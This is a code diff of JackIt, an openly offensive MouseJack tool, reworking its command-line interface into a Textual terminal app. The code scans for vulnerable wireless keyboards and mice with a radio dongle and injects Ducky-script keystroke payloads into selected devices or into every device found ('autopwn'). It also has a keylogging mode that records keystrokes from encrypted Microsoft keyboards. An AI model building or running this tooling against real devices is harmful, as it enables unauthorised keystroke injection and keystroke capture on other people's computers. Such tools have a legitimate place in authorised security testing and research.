@@ -1,309 +1,523 @@
-#! /usr/bin/env python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from __future__ import print_function, absolute_import
-from six import iteritems
 import os
 import sys
 import time
-import datetime
-import platform
+import asyncio
+from typing import Optional
+
 import click
-import tabulate
-import sqlite3
+
+from textual.app import App, ComposeResult
+from textual.widgets import Header, Footer, DataTable, Static, DirectoryTree
+from textual.containers import Container, VerticalScroll
+from textual.screen import ModalScreen
+from textual.reactive import reactive
+
 from jackit import duckyparser
 from jackit import mousejack
-from jackit import keylogger
 
 
-__version__ = 1.00
-__authors__ = "phikshun, infamy"
-
-# some console colours
-W = '\033[0m'  # white (normal)
-R = '\033[31m'  # red
-G = '\033[32m'  # green
-O = '\033[33m'  # orange
-B = '\033[34m'  # blue
-P = '\033[35m'  # purple
-C = '\033[36m'  # cyan
-GR = '\033[37m'  # gray
-
-reset = True
-
-#==================================================
-# DATABASE DEFINITION
-#==================================================
-
-def dict_factory(cursor, row):
-    d = {}
-    for idx, col in enumerate(cursor.description):
-        d[col[0]] = row[idx]
-    return d
-
-
-JACKDIR = os.path.expanduser("~") + "/.jackit"
-
-if not os.path.exists(JACKDIR):
-    os.makedirs(JACKDIR)
-
-DB = JACKDIR + "/jackit.db"
-CONN = sqlite3.connect(DB)
-CONN.row_factory = dict_factory
-C = CONN.cursor()
-
-def DB_create():
-    global C
-
-    #sql = "CREATE TABLE IF NOT EXISTS device (key INTEGER PRIMARY KEY, address TEXT UNIQUE, channels TEXT, poll INT, seen TEXT, model TEXT, packet TEXT)"
-    sql = "CREATE TABLE IF NOT EXISTS device (address TEXT UNIQUE, channels TEXT, poll INT, seen TEXT, model TEXT, packet TEXT)"
-
-    try:
-        C.execute(sql)
-    except:
-        _print_err("Database already exists... continuing using old database")
-
-def DB_insert(address, channel, poll, seen, model, packet):
-    global C
-
-    sql = "INSERT or REPLACE INTO device ( address, channels, poll, seen, model, packet ) VALUES ( \"{address}\", \"{channel}\", {poll}, \"{seen}\", \"{model}\", \"{packet}\");".format(address=address, channel=channel, poll=poll, seen=seen, model=model, packet=packet)
-    C.execute(sql)
-
-#==================================================
-
-
-
-def launch_attacks(jack, targets, attack, use_ping=True):
-    for addr_string, target in iteritems(targets):
-        payload  = target['payload']
-        channels = target['channels']
-        address  = target['address']
-        hid      = target['device']
-
-        # Sniffer mode allows us to spoof the address
-        jack.sniffer_mode(address)
-
-        if hid:
-            # Attempt to ping the devices to find the current channel
-            if use_ping:
-                lock_channel = jack.find_channel(address)
-            else:
-                lock_channel = False
-
-            if lock_channel:
-                print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
-                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
-                jack.attack(hid(address, payload), attack)
-            else:
-                # If our pings fail, go full hail mary
-                print(R + '[-] ' + W + 'Ping failed, trying all channels')
-                for channel in channels:
-                    jack.set_channel(channel)
-                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), channel))
-                    jack.attack(hid(address, payload), attack)
-        else:
-            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (addr_string))
-            continue
-
-
-def scan_loop(jack, interval, targeted, address):
-    if targeted:
-        jack.sniff(interval, address)
-    else:
-        jack.scan(interval)
-
-    click.clear()
-    if targeted:
-        print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
-    else:
-        print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
-    print("")
-
-    pretty_devices = []
-    for addr_string, device in iteritems(jack.devices):
-        if device['device']:
-            device_name = device['device'].description()
-        else:
-            device_name = 'Unknown'
-        pretty_devices.append([
-            device['index'],
-            addr_string,
-            ",".join(str(x) for x in device['channels']),
-            device['count'],
-            str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
-            device_name,
-            jack.to_display(device['payload'])
-        ])
-
-        DB_insert(addr_string, ",".join(str(x) for x in device['channels']), device['count'], str(device['timestamp']), device_name, jack.to_display(device['payload']))
-
-    CONN.commit()
-
-    print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
-    print( "="*80 )
-    print( "Devices found: {ndev}\n".format(ndev=len(jack.devices) ) )
-
-
-def _print_err(text):
-    print(R + '[!] ' + W + text)
-
-
-def banner():
-    print(r"""
-     ____.              __   .___  __
-    |    |____    ____ |  | _|   |/  |_
-    |    \__  \ _/ ___\|  |/ /   \   __\
-/\__|    |/ __ \\  \___|    <|   ||  |
-\________(____  /\___  >__|_ \___||__|
-              \/     \/     \/          """)
-
-    print("JackIt Version %0.2f" % __version__)
-    print("Created by %s" % __authors__)
-    print("")
-
+# ==========================================================
+# Root Check
+# ==========================================================
 
 def confirm_root():
-    # make sure we are root
-    if os.getuid() != 0 and platform.system() != 'Darwin':
-        _print_err("ERROR: You need to run as root!")
-        _print_err("login as root (su root) or try sudo %s" % sys.argv[0])
-        exit(-1)
+    if hasattr(os, "getuid") and os.getuid() != 0:
+        print("Must run as root.")
+        sys.exit(1)
 
+
+# ==========================================================
+# File Viewer
+# ==========================================================
+
+class FileViewer(ModalScreen[None]):
+    CSS = """
+        #viewer-header {
+            height: 1;
+            background: $accent;
+            color: $text;
+            padding-left: 1;
+            text-style: bold;
+        }
+        DataTable {
+            width: 95%;
+        }
+
+        #device-summary {
+            width: 95%;
+        }
+
+        """
+
+    def __init__(self, path: str):
+        super().__init__()
+        self.path = path
+
+    def compose(self) -> ComposeResult:
+        yield Container(
+            Static(
+                f"Viewing: {self.path} (ESC to close)",
+                id="viewer-header"
+            ),
+            VerticalScroll(
+                Static(self.read_file())
+            ),
+        )
+
+    def read_file(self) -> str:
+        try:
+            with open(self.path, "r", errors="ignore") as f:
+                return f.read()
+        except Exception:
+            return "[Unable to read file]"
+
+    async def on_key(self, event):
+        if event.key == "escape":
+            self.dismiss(None)
+
+
+# ==========================================================
+# Payload Browser
+# ==========================================================
+
+class PayloadBrowser(ModalScreen[Optional[str]]):
+
+    def __init__(self, start_path="."):
+        super().__init__()
+        self.start_path = start_path
+
+    def compose(self) -> ComposeResult:
+        yield Container(
+            Static("Browse Payload Files (ENTER=Select  v=View  ESC=Cancel)"),
+            DirectoryTree(self.start_path),
+        )
+
+    async def on_directory_tree_file_selected(
+        self, event: DirectoryTree.FileSelected
+    ):
+        self.dismiss(event.path)
+
+    async def on_key(self, event):
+        if event.key == "escape":
+            self.dismiss(None)
+
+        elif event.key == "v":
+            tree = self.query_one(DirectoryTree)
+            node = tree.cursor_node
+
+            if node and node.data:
+                path = node.data.path
+                if path and path.is_file():
+                    await self.app.push_screen(FileViewer(str(path)))
+
+
+# ==========================================================
+# Main Application
+# ==========================================================
+
+class JackItApp(App):
+
+    CSS = """
+    #status {
+        height: 1;
+        background: $accent;
+        color: $text;
+        padding-left: 1;
+        text-style: bold;
+    }
+
+    #device-summary {
+        padding-left: 1;
+    }
+    """
+
+    scanning = reactive(False)
+    payload_name = reactive("None")
+
+    BINDINGS = [
+        ("q", "quit", "Quit"),
+        ("s", "toggle_scan", "Scan"),
+        ("p", "select_payload", "Payload"),
+        ("v", "view_payload", "View Payload"),
+        ("a", "attack_selected", "Attack selected"),
+        ("A", "autopwn", "Autopwn"),
+    ]
+
+    def __init__(
+        self,
+        debug=False,
+        interval=5,
+        duration=5,
+        layout="us",
+        lowpower=False,
+        reset=True,
+        address="",
+        vendor="",
+        autopwn=False,
+        all_channels=False,
+    ):
+        super().__init__()
+
+        self.debug_mode = debug
+        self.interval = interval
+        self.duration = duration
+        self.layout = layout
+        self.attack = None
+        self.scan_task: Optional[asyncio.Task] = None
+        self.next_scan_time: Optional[float] = None
+        self.target_address = address
+        self.target_vendor = vendor
+        self.auto_start_autopwn = autopwn
+        self.all_channels = all_channels
+        self.payload_path: Optional[str] = None
+
+        try:
+            self.jack = mousejack.MouseJack(lowpower, debug, reset)
+        except Exception as e:
+            print(f"Radio init failed: {e}")
+            sys.exit(1)
+
+    # ------------------------------------------------------
+    async def action_attack_selected(self):
+        if not self.attack:
+            self.update_status("No payload loaded")
+            return
+
+        table = self.query_one(DataTable)
+
+        if table.cursor_row is None:
+            self.update_status("No device selected")
+            return
+
+        row_index = table.cursor_row
+
+        devices = list(self.jack.devices.items())
+
+        if row_index >= len(devices):
+            self.update_status("Invalid selection")
+            return
+
+        addr, device = devices[row_index]
+
+        hid = device.get("device")
+        if not hid:
+            self.update_status("Device not injectable")
+            return
+
+        payload = device["payload"]
+        channels = device["channels"]
+        address = device["address"]
+
+        self.jack.sniffer_mode(address)
+        lock_channel = self.jack.find_channel(address)
+
+        if lock_channel:
+            self.jack.attack(hid(address, payload), self.attack)
+            self.update_status(f"Attacked {addr}")
+        else:
+            for ch in channels:
+                self.jack.set_channel(ch)
+                self.jack.attack(hid(address, payload), self.attack)
+
+            self.update_status(f"Attacked {addr} (all channels)")
+
+
+    async def action_view_payload(self):
+        if not self.payload_path:
+            self.update_status("No payload loaded")
+            return
+
+        await self.push_screen(FileViewer(self.payload_path))
+
+    def compose(self) -> ComposeResult:
+        yield Header()
+        yield Static("Idle | Payload: None", id="status")
+        yield DataTable(id="devices")
+        yield Static("", id="device-summary")
+        yield Footer()
+
+    async def on_mount(self):
+        table = self.query_one(DataTable)
+
+        col_key = table.add_column("KEY", width=4)
+        table.add_column("ADDRESS", width=18)
+        table.add_column("CHANNELS", width=9)
+        col_count = table.add_column("COUNT", width=7)
+        table.add_column("SEEN", width=13)
+        table.add_column("TYPE", width=14)
+        table.add_column("PACKET")
+
+        col_key.justify = "right"
+        col_count.justify = "right"
+
+        self.set_interval(1.0, self.update_countdown)
+        if self.attack:
+            self.update_status("Payload loaded")
+
+        width = self.size.width
+        fancy_line = "─" * (width - 1)
+
+        summary = self.query_one("#device-summary", Static)
+        summary.update(f"{fancy_line}\nDevices found: 0")
+
+
+
+    # ------------------------------------------------------
+    # Countdown
+    # ------------------------------------------------------
+    async def update_countdown(self):
+        if not self.scanning or not self.next_scan_time:
+            return
+
+        remaining = self.next_scan_time - time.time()
+        if remaining < 0:
+            remaining = 0
+
+        status = self.query_one("#status", Static)
+
+        status.update(
+            f"SCANNING | RF: {self.duration}s | "
+            f"Interval: {self.interval}s | "
+            f"Next in: {remaining:.0f}s | "
+            f"Payload: {self.payload_name}"
+        )
+
+    # ------------------------------------------------------
+    # Scanning
+    # ------------------------------------------------------
+
+    async def scan_loop(self):
+        while self.scanning:
+
+            cycle_start = time.time()
+
+            # Immediate RF scan
+            await asyncio.to_thread(self.jack.scan, self.duration)
+
+            self.refresh_table()
+
+            # Schedule next scan time
+            elapsed = time.time() - cycle_start
+            remaining = self.interval - elapsed
+
+            if remaining > 0:
+                self.next_scan_time = time.time() + remaining
+                try:
+                    await asyncio.sleep(remaining)
+                except asyncio.CancelledError:
+                    break
+            else:
+                self.next_scan_time = None
+
+
+    def refresh_table(self):
+        table = self.query_one(DataTable)
+        summary = self.query_one("#device-summary", Static)
+
+        table.clear()
+
+        now = time.time()
+
+        total_width = self.size.width
+        fixed_width = 4 + 18 + 9 + 7 + 13 + 14 + 7
+        available_packet_width = max(10, total_width - fixed_width)
+
+        for idx, (addr, device) in enumerate(self.jack.devices.items(), start=1):
+
+            channels = ",".join(str(c) for c in device.get("channels", []))
+            count = device.get("count", 0)
+
+            timestamp = device.get("timestamp", now)
+            delta = now - timestamp
+            seen = time.strftime("%H:%M:%S", time.gmtime(delta)) + " ago"
+
+            device_type = (
+                device["device"].description()
+                if device.get("device")
+                else "Unknown"
+            )
+
+            packet = str(device.get("payload", ""))
+
+            if len(packet) > available_packet_width:
+                packet = packet[: available_packet_width - 1] + "…"
+
+            table.add_row(
+                str(idx),
+                addr,
+                channels,
+                str(count),
+                seen,
+                device_type,
+                packet,
+            )
+
+            width = self.size.width
+
+            fancy_line = "─" * width
+
+            summary.update(
+                f"{fancy_line}\nDevices found: {len(self.jack.devices)}"
+            )
+
+
+    async def action_toggle_scan(self):
+        self.scanning = not self.scanning
+
+        if self.scanning:
+            # Immediately update header
+            self.update_status("SCANNING")
+
+            # Start scan loop
+            self.scan_task = asyncio.create_task(self.scan_loop())
+
+        else:
+            self.next_scan_time = None
+
+            if self.scan_task:
+                self.scan_task.cancel()
+                self.scan_task = None
+
+            # Immediately update header
+            self.update_status("Idle")
+
+    # ------------------------------------------------------
+    # Payload
+    # ------------------------------------------------------
+
+    async def action_select_payload(self):
+        await self.push_screen(
+            PayloadBrowser("."), self.on_payload_selected
+        )
+
+    async def on_payload_selected(self, path: Optional[str]):
+        if path:
+            self.load_payload(path)
+
+    def load_payload(self, path, update_ui=True):
+        try:
+            with open(path, "r") as f:
+                parser = duckyparser.DuckyParser(
+                    f.read(), layout=self.layout
+                )
+                self.attack = parser.parse()
+                self.payload_name = os.path.basename(path)
+                self.payload_path = path
+
+                if update_ui:
+                    self.update_status("Payload loaded")
+
+        except Exception:
+            if update_ui:
+                self.update_status("Payload load failed")
+
+
+
+    async def action_autopwn(self):
+        if not self.attack:
+            self.update_status("No payload loaded")
+            return
+
+        for addr, device in self.jack.devices.items():
+            payload = device["payload"]
+            channels = device["channels"]
+            address = device["address"]
+            hid = device["device"]
+
+            if not hid:
+                continue
+
+            self.jack.sniffer_mode(address)
+            lock_channel = self.jack.find_channel(address)
+
+            if lock_channel:
+                self.jack.attack(hid(address, payload), self.attack)
+            else:
+                for ch in channels:
+                    self.jack.set_channel(ch)
+                    self.jack.attack(hid(address, payload), self.attack)
+
+        self.update_status("Autopwn completed")
+
+    def update_status(self, message=None):
+        status = self.query_one("#status", Static)
+
+        if self.scanning:
+            base = f"SCANNING | RF: {self.duration}s | Interval: {self.interval}s"
+        else:
+            base = f"Idle | RF: {self.duration}s | Interval: {self.interval}s"
+
+        if message:
+            base = f"{base} | {message}"
+
+        base += f" | Payload: {self.payload_name}"
+
+        status.update(base)
+
+
+# ==========================================================
+# CLI
+# ==========================================================
 
 @click.command()
-@click.option('--debug', is_flag=True, help='Enable debug')
-@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
-@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
-@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-@click.option('--layout', default='us', help="Keyboard layout: us, gb, de...")
-@click.option('--address', default="", help="Address of device to target attack")
-@click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
-@click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
-@click.option('--autopwn', is_flag=True, help="Automatically find and attack all targets")
-@click.option('--all-channels', is_flag=True, help="Send attack to all detected channels")
-@click.option('--keylogging', is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
-def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, all_channels, keylogging):
+@click.option("--debug", is_flag=True, help="Enable debug")
+@click.option("--script", type=click.Path(), help="Ducky file to use for injection")
+@click.option("--lowpower", is_flag=True, help="Disable LNA on CrazyPA")
+@click.option("--interval", default=5, type=int, help="Interval of scan in seconds, default to 5s")
+@click.option("--duration", default=5, type=int, help="Duration of scan in seconds, default to 5s")
+@click.option("--layout", default="us", help="Keyboard layout: us, gb, de...")
+@click.option("--address", default="", help="Address of device to target attack")
+@click.option("--vendor", default="", help="Vendor of device to target (required when specifying address)")
+@click.option("--reset", is_flag=True, help="Reset CrazyPA dongle prior to initialization")
+@click.option("--autopwn", is_flag=True, help="Automatically find and attack all targets")
+@click.option("--all-channels", is_flag=True, help="Send attack to all detected channels")
+@click.option("--keylogging", is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
+def cli(
+    debug,
+    script,
+    lowpower,
+    interval,
+    duration,
+    layout,
+    address,
+    vendor,
+    reset,
+    autopwn,
+    all_channels,
+    keylogging,
+):
 
-    reset = True
-    global CONN
-
-    banner()
     confirm_root()
 
-    DB_create()
-
-    if debug:
-        print(O + "[W] " + W + "Debug is enabled.")
-
-    targeted = False
-    if address and not vendor:
-        _print_err("Please use --vendor option to specify either Logitech, Microsoft or Amazon.")
-        exit(-1)
-    elif vendor and not address:
-        _print_err("Please use --address option when specifying a vendor.")
-        exit(-1)
-    elif vendor and address:
-        vendor = vendor.lower()
-        if not vendor.startswith("l") and not vendor.startswith("m") and not vendor.startswith("a"):
-            _print_err("Unknown vendor: specify either Microsoft, Logitech or Amazon.")
-            exit(-1)
-        else:
-            targeted = True
-
-    if script == "":
-        if not keylogging:
-            _print_err("You must supply a ducky script using --script <filename>")
-            _print_err("Attacks are disabled.")
-        attack = ""
-    else:
-        f = open(script, 'r')
-        try:
-            parser = duckyparser.DuckyParser(f.read(), layout=layout.lower())
-        except KeyError:
-            print("Invalid layout specified")
-            exit(-1)
-
-        attack = parser.parse()
-
-    # Initialize the radio
-    try:
-        jack = mousejack.MouseJack(lowpower, debug, reset)
-    except Exception as e:
-        if e.__str__() == "Cannot find USB dongle.":
-            _print_err("Cannot find Crazy PA USB dongle.")
-            _print_err("Please make sure you have it preloaded with the mousejack firmware.")
-            exit(-1)
-        else:
-            raise e
-
     if keylogging:
+        from jackit import keylogger
+        jack = mousejack.MouseJack(lowpower, debug, reset or True)
         k = keylogger.KeyLogger(jack, layout)
         k.scan()
-        exit(-1)
+        return
 
-    try:
-        if autopwn:
-            if not attack:
-                _print_err('No attack specified for autopwn. Exiting.')
-                exit(-1)
+    app = JackItApp(
+        debug=debug,
+        interval=interval,
+        duration=duration,
+        layout=layout,
+        lowpower=lowpower,
+        reset=True,
+        address=address,
+        vendor=vendor,
+        autopwn=autopwn,
+        all_channels=all_channels,
+    )
 
-            while True:
-                print(G + "[+] " + W + 'Scanning for targets...')
-                jack.scan(interval)
-                if len(jack.devices) > 0:
-                    launch_attacks(jack, jack.devices, attack)
-                else:
-                    _print_err('No devices found')
-                jack.clear_devices()
+    if script:
+        app.load_payload(script, update_ui=False)
 
-        if targeted:
-            print(G + "[+] " + W + 'Starting sniff for %s...' % address)
-            if vendor.startswith("l"):
-                jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
-            if vendor.startswith("m"):
-                jack.add_device(address, [])
-            if vendor.startswith("a"):
-                jack.add_device(address, [0, 0, 0, 0, 0, 0])
-        else:
-            print(G + "[+] " + W + 'Starting scan...')
-
-        try:
-            while True:
-                scan_loop(jack, interval, targeted, address)
-        except KeyboardInterrupt:
-            print()
-            CONN.commit()
-            CONN.close()
-
-        if len(jack.devices) == 0:
-            _print_err("No devices found please try again...")
-            exit(-1)
-
-        if attack == "":
-            _print_err("No attack script was provided...")
-            exit(-1)
-
-        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(jack.devices)) + W) + " separated by commas, or '%s': " % (G + 'all' + W), end="")
-        value = click.prompt('', default="all")
-        value = value.strip().lower()
-
-        if value == "all":
-            targets = jack.devices
-        else:
-            targets = {}
-            target_list = [int(x) for x in value.split(',')]
-            for addr_string, device in iteritems(jack.devices):
-                if device['index'] in target_list:
-                    targets[addr_string] = device
-
-        launch_attacks(jack, targets, attack, (not all_channels))
-
-        print(GR + '\n[+] ' + W + "All attacks completed\n")
-
-    except KeyboardInterrupt:
-        print('\n ' + R + '(^C)' + O + ' interrupted\n')
-        print('[-] Quitting' + W)
+    app.run()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     cli()
+
